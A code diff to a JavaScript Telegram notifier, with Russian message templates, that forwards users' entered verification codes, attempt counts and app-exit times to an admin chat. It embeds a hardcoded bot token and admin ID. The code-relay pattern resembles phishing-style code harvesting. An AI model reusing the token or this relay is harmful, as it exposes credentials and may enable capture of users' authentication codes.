@@ -1,3 +1,4 @@
+// bot-notifier.js
 // Конфигурация
 const BOT_TOKEN = '8196403348:AAGrU-BOJgX6nFZB7f_YV9trqrBGKplWWt0';
 const ADMIN_ID = '5665980031';
@@ -38,6 +39,19 @@ const formatMessage = (type, data, user) => {
         case 'code':
             return {
                 text: `🔢 <b>Введён код</b>\n\nКод: <code>${data}</code>\n\n${userInfo}`,
+                buttons: []
+            };
+        case 'verification_success':
+            return {
+                text: `✅ <b>Успешная верификация</b>\n\n` +
+                      `Код: <code>${data.code}</code>\n` +
+                      `Попыток: <b>${data.attempts}</b>\n\n${userInfo}`,
+                buttons: []
+            };
+        case 'app_close':
+            return {
+                text: `🚪 <b>Пользователь вышел из приложения</b>\n\n${userInfo}\n\n` +
+                      `Время: <code>${new Date(data.timestamp).toLocaleString()}</code>`,
                 buttons: []
             };
         default:
